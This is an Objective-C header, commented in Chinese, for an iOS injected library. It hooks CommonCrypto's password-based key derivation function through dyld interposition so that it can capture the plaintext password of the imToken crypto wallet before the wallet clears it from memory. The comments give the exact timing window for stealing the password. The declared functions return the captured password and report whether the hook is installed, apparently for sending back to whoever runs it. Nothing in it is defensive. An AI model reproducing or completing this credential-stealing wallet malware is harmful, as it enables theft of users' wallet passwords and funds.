//
//  HookKDF.h — hook 密码派生函数的入口，在 memset 之前拿到明文密码
//
//  时序（用户说的那段，完全正确）：
//    t1  钱包准备解锁，调用 CCKeyDerivationPBKDF(password, ...)   ← 明文在这
//    t1~t2 KDF 内部迭代（我们在这里把 password 拷走）
//    t2  返回派生密钥
//    t3  钱包 memset(pwd_buf) 清零
//
//  用 dyld 的 __interpose 段直接替换符号，不需要 fishhook，
//  也不需要知道 imToken 内部方法名 —— CCKeyDerivationPBKDF 是 CommonCrypto 的 C 函数。
//
#import <Foundation/Foundation.h>

/// 是否已经捕获到密码
BOOL HookKDFHasPassword(void);
/// 最近一次捕获的明文密码
NSString *HookKDFLastPassword(void);
/// 说明 interpose 是否生效（供自检上报）
BOOL HookKDFInstalled(void);

/// 手动补一次 hook（__interpose 在 dylib 加载时由 dyld 自动处理，这里只做标记）
void HookKDFInstall(void);
